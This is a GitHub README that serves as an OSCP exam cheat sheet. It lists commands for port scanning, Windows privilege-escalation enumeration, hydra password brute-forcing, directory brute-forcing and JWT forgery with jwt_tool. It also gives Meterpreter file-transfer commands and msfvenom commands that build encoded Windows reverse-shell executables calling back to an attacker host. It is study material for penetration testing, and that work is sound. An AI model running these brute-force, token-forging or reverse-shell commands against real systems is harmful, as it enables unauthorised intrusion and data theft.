# oscp-cheatsheet
This repository describes cheat sheet and knowledge for OSCP.

# Contents
<!-- START doctoc -->
<!-- END doctoc -->
# Enumeration
## Network
### nmap
#### Example
```console
nmap -sV -T4 -Pn <Target IP Address>
```
#### Options
`-sV`: Show opening ports and running services.  
`-T4`: Prohibit the dynamic scan delay from exceeding 10ms for TCP ports  
`-Pn`: Disable sending ping packets to discover a host  
`-A`: Detect OS and its version.  
`-p`: Specify range of ports. Scan all ports (1-65535) if using the option `-p-`  

## Windows Privilege Escalation
### PowerUp.ps1
This script enumerates the privileges vulnerabilities in Windows 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

### Scan
```console
. .\PowerUp.ps1
Invoke-PrivescAudit [-HTMLReport]
```
Note that this tool output "COMPUTER.username.html" if the `-HTMLReport` is enabled.


# Brute Force Attack
## Password
### hydra
#### Example
- Brute force attack for username and password (HTTP POST)
```console
hydra -L <username list file> -P <password list file> <ip address> http-post-form '<path>:<query parameter>:<string when failing login>'  
```
- Brute force attack for the password (HTTP POST)
```console
hydra -l <username> -P <password list file> <ip address> http-post-form '<path>:<query parameter>:<string when failing login>'
```
We can set the following variables when specifying the list file:  
`^USER^`: Replace this string in \<query parameter\> with the username listed in \<username list file\>  
`^PASSWORD^`: Replace this string in \<query parameter\> with the password listed in \<password list file\>

## Directory
### dirb
```
dirb <target URL>
```

## File
#### dirb
```
dirb <targetURL> -X <extension list separated by comma (e.g. .sh, .pl, .txt, .php, .py)>
```

### gobuster
```
gobuster dir -x .sh, .pl, .txt, .php, .py -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
```

## Directory
### dirb
```
dirb <target url>
```

### gobuster
```
gobuster dir -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
```
# JWT (JSON Web Token) exploit

### Debugger
This website provides decoding JWT and editing the payload in decoded JWT.  
https://jwt.io/

### jwt_tool
This tool helps us to validate, tamper, and forge JWTs for a pentester.  
https://github.com/ticarpi/jwt_tool


#### tampering
```
python jwt_tool.py <JWT> -T
```

#### exploit
```
python jwt_tool.py <JWT> -X <parameter>
```
The parameter can be specified as follow:  
`a`: alg:none  
`n`: null signature  
`b`: blank password accepted in signture  
`s`: spoof JWKS  
`k`: key confusion  
`i`: inject inline JKWS  


# Linux command

## Basic command
### Show allowing commands as root user
```
sudo -l
```
## String Processing
### Remove white spaces
```
sed 's/ //g'
```

## SMB
### smbclient
```console
smbclient -L <target>  # Enumerate sharenames
smbclient //<target>/<sharename>
get <filename>
```

# Windows command
## Powershell
### Create New file
```
New-Item <filename> -Type File
```

### Display the contents of a text file
```
type <filename>
```



# Metasploit
## meterpreter
## Get system info
```
sysinfo
```
### Start shell
```
shell
```

### Upload file from Metasploit host to target
```
upload <filepath>
```

### Download file from target to Metasploit host
```
download <filepath>
```

### Load powershell and run
```
load powershell
powershell_shell
```
## msfvenom
This tool creates a payload, such as reverse shell, embedded in a file.

### Windows
#### exe
```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe -o evil.exe
```
#### exe-service
```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
```

# Others

## References for OSCP
### GTFOBins
This website is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.  
https://gtfobins.github.io/

## References for vulnerabilities
### Shellshock (CVE-2014-6271)
https://blog.cloudflare.com/inside-shellshock/



# LICENSE
MIT

